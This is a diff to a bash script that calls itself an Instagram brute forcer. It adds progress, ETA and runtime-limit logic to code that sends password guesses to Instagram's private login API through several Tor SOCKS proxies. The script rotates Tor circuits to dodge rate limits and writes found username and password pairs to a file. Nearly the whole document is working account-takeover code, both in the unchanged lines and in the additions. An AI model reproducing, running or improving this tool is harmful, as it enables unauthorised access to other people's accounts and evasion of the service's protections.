@@ -24,8 +24,14 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
+# Variables for ETA calculation
+start_time=$(date +%s)
+total_passwords=0
+processed_passwords=0
+max_runtime=3600  # Maximum runtime in seconds (1 hour by default)
 var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
 var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
+
 
 
 banner() {
@@ -39,6 +45,51 @@ printf "\n"
 printf "\e[1;77m\e[41m  Instagram Brute Forcer v1.0, Author: @bhikan_deshmukh (Github/IG)  \e[0m\n" #Don't change, noob
 printf "\n"
 }
+
+check_wordlist() {
+    if [ ! -s "$wl_pass" ]; then
+        printf "\e[1;91m[!] Error: Password list is empty or does not exist!\e[0m\n"
+        exit 1
+    fi
+    
+    total_passwords=$(wc -l < "$wl_pass")
+    printf "\e[1;92m[*] Total passwords to test: \e[0m\e[1;77m%s\e[0m\n" $total_passwords
+    printf "\e[1;92m[*] Estimated maximum runtime: \e[0m\e[1;77m1 hour\e[0m\n"
+    printf "\e[1;92m[*] You can press Ctrl+C at any time to stop the attack\e[0m\n"
+}
+
+calculate_eta() {
+    current_time=$(date +%s)
+    elapsed=$((current_time - start_time))
+    
+    # Check if maximum runtime exceeded
+    if [ $elapsed -gt $max_runtime ]; then
+        printf "\e[1;91m[!] Maximum runtime exceeded (1 hour). Stopping attack.\e[0m\n"
+        printf "\e[1;92m[*] Passwords tested: \e[0m\e[1;77m%s/%s\e[0m\n" $processed_passwords $total_passwords
+        store
+        exit 1
+    fi
+    
+    # Only calculate ETA if we've processed some passwords
+    if [ $processed_passwords -gt 0 ]; then
+        rate=$(echo "scale=2; $processed_passwords / $elapsed" | bc)
+        remaining_passwords=$((total_passwords - processed_passwords))
+        
+        if [ "$rate" != "0" ] && [ "$rate" != "" ]; then
+            eta=$(echo "scale=0; $remaining_passwords / $rate" | bc)
+            
+            # Convert seconds to hours, minutes, seconds
+            eta_h=$((eta / 3600))
+            eta_m=$(((eta % 3600) / 60))
+            eta_s=$((eta % 60))
+            
+            printf "\e[1;92m[*] Progress: \e[0m\e[1;77m%s/%s\e[0m \e[1;92m(\e[0m\e[1;77m%0.2f%%\e[0m\e[1;92m)\e[0m\n" $processed_passwords $total_passwords $(echo "scale=2; $processed_passwords * 100 / $total_passwords" | bc)
+            printf "\e[1;92m[*] Rate: \e[0m\e[1;77m%0.2f passwords/second\e[0m\n" $rate
+            printf "\e[1;92m[*] ETA: \e[0m\e[1;77m%02d:%02d:%02d\e[0m\n" $eta_h $eta_m $eta_s
+        fi
+    fi
+}
+
 
 
 function start() {
@@ -54,6 +105,9 @@ read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
 wl_pass="${wl_pass:-${default_wl_pass}}"
 default_threads="100"
 threads="${threads:-${default_threads}}"
+
+# Check if wordlist exists and is not empty
+check_wordlist
 fi
 }
 
@@ -229,6 +283,13 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
+
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1  ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;
@@ -257,6 +318,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter2++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -286,6 +353,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter3++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -316,6 +389,13 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 
 let counter4++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
+
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;
@@ -342,6 +422,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter5++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -374,6 +460,13 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 
 let counter++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
+
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;
@@ -404,6 +497,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter2++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -435,6 +534,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter3++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -469,6 +574,13 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 
 let counter4++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
+
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;
@@ -501,6 +613,12 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let counter5++
+let processed_passwords++
+
+# Calculate and display ETA every 10 passwords
+if [ $((processed_passwords % 10)) -eq 0 ]; then
+    calculate_eta
+fi
 
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
@@ -573,6 +691,9 @@ start
 multitor
 killall -HUP tor
 while [ $countpass -lt $count_pass ]; do
+
+# Calculate and display ETA
+calculate_eta
 
 killall -HUP tor
 ##pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"
